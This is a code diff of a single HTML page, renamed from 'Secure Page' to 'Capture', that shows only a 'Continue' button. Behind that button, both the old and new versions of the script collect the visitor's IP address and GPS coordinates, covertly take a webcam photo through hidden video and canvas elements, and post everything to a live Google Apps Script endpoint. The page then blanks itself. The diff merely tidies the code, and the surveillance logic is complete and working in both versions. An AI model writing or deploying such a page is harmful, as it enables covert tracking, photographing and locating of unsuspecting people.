@@ -2,43 +2,41 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Secure Page</title>
+  <title>Capture</title>
 </head>
 <body>
-<button id="start">Continue</button>
+
+<button id="btn">Continue</button>
 
 <video id="video" autoplay playsinline style="display:none"></video>
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxHs52mIOt0df8YQYniKQU8GDfMeUs13gRdze8wgr-G9BW90fa6HcLNdH7cmthr6KDMZA/exec";
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzxh3l6cjZBV6u1Op8OkOM2eSAB_lZM2454kvub-6C82Gfq-uCOB9bq74HqIFdsZMQ0pg/exec"; // 👈 paste Apps Script Web App URL here
 
-async function getIP() {
+document.getElementById("btn").onclick = async () => {
+
+  // 🔹 Get IP
+  let ip = "";
   try {
-    const res = await fetch("https://api.ipify.org?format=json");
-    const data = await res.json();
-    return data.ip;
-  } catch {
-    return "IP not found";
-  }
-}
+    const r = await fetch("https://api.ipify.org?format=json");
+    ip = (await r.json()).ip;
+  } catch(e) {}
 
-document.getElementById("start").onclick = async () => {
-
-  // LOCATION
-  let locationData = null;
+  // 🔹 Get Location
+  let location = {};
   try {
     const pos = await new Promise((res, rej) =>
       navigator.geolocation.getCurrentPosition(res, rej)
     );
-    locationData = {
-      latitude: pos.coords.latitude,
-      longitude: pos.coords.longitude
+    location = {
+      lat: pos.coords.latitude,
+      lng: pos.coords.longitude
     };
-  } catch {}
+  } catch(e) {}
 
-  // CAMERA
-  let photoData = null;
+  // 🔹 Get Camera Photo
+  let photo = "";
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     const video = document.getElementById("video");
@@ -50,29 +48,28 @@ document.getElementById("start").onclick = async () => {
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     canvas.getContext("2d").drawImage(video, 0, 0);
-    photoData = canvas.toDataURL("image/jpeg");
+
+    photo = canvas.toDataURL("image/jpeg");
 
     stream.getTracks().forEach(t => t.stop());
-  } catch {}
+  } catch(e) {}
 
-  // IP
-  const ipAddress = await getIP();
-
-  // SEND DATA
+  // 🔹 Send Data
   await fetch(WEB_APP_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      location: locationData,
+      ip: ip,
+      location: location,
       device: navigator.userAgent,
-      photo: photoData,
-      ip: ipAddress
+      photo: photo
     })
   });
 
-  // BLANK PAGE
+  // 🔹 Make page blank
   document.body.innerHTML = "";
 };
 </script>
+
 </body>
 </html>
